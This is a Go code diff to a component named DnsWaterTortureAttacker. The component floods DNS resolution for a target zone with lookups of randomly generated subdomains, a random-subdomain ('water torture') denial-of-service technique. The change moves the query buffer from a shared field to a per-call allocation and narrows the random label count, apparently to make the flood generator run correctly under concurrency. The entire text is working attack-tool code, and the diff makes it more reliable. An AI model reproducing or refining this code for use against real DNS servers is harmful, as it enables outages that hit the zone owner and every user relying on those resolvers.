@@ -29,7 +29,6 @@ var counter = uint64(1)
 
 type DnsWaterTortureAttacker struct {
 	resolver *resolver.DNSResolver
-	buffer   *bytes.Buffer
 }
 
 func int63() int64 {
@@ -55,26 +54,23 @@ func randString(bb *bytes.Buffer, n int) {
 
 func NewDnsWaterTortureAttacker() *DnsWaterTortureAttacker {
 	dnsResolver := resolver.NewDNSResolver()
-	bb := new(bytes.Buffer)
-	bb.Grow(len(zone) + maxLength + 1)
 	return &DnsWaterTortureAttacker{
 		resolver: dnsResolver,
-		buffer:   bb,
 	}
 }
 
 func (a *DnsWaterTortureAttacker) Attack(ctx context.Context) {
-	defer a.buffer.Reset()
+	buf := new(bytes.Buffer)
 	numOfLabel := 1
 	if atomic.AddUint64(&counter, 1); counter%50 == 0 {
-		numOfLabel += rand.Intn(5)
+		numOfLabel += rand.Intn(3)
 	}
 	for i := 0; i < numOfLabel; i++ {
 		length := 10 + rand.Intn(maxLength)
-		randString(a.buffer, length)
-		a.buffer.WriteByte('.')
+		randString(buf, length)
+		buf.WriteByte('.')
 	}
-	a.buffer.WriteString(zone)
-	b := a.buffer.Bytes()
+	buf.WriteString(zone)
+	b := buf.Bytes()
 	a.resolver.Lookup(ctx, "udp", unsafe.String(&b[0], len(b)))
 }
